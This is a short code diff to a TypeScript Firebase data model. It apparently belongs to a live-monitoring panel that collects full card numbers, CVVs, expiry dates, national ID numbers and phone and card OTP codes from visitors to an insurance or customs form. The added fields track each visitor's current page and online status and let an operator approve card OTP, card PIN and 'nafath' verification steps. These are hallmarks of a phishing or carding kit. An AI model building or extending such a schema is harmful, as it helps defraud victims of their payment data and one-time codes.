@@ -1,6 +1,6 @@
 import { initializeApp, getApps, getApp } from "firebase/app";
 import { getAuth } from "firebase/auth";
-import { getFirestore } from "firebase/firestore";
+import { getFirestore, Timestamp } from "firebase/firestore";
 import { getDatabase } from "firebase/database";
 
 const firebaseConfig = {
@@ -36,17 +36,20 @@ interface FormData {
 
 interface NotificationDocument {
   id: string;
+  visitorId?: string;
   agreeToTerms?: boolean;
   buyer_identity_number?: string;
   card_number?: string;
   country?: string;
   createdDate: string;
+  timestamp?: Timestamp;
   customs_code?: string;
   cvv?: string;
   document_owner_full_name?: string;
   expiration_date?: string;
   formData?: FormData;
   cardNumber?: string;
+  cardLast4?: string;
   full_name?: string;
   insurance_purpose?: string;
   owner_identity_number?: string;
@@ -74,8 +77,16 @@ interface NotificationDocument {
   autnAttachment?: string;
   requierdAttachment?: string;
   operator?: string;
-  otpPhoneStatus: string;
-  phoneOtpCode: string;
-  phoneVerificationStatus: string;
+  otpPhoneStatus?: string;
+  phoneOtpCode?: string;
+  phoneVerificationStatus?: string;
+  action?: string;
+  currentPage?: string;
+  currentStep?: string;
+  online?: boolean;
+  lastSeen?: Timestamp | Date | string;
+  cardOtpApproved?: boolean;
+  cardPinApproved?: boolean;
+  phoneOtpApproved?: boolean;
+  nafathApproved?: boolean;
 }
-
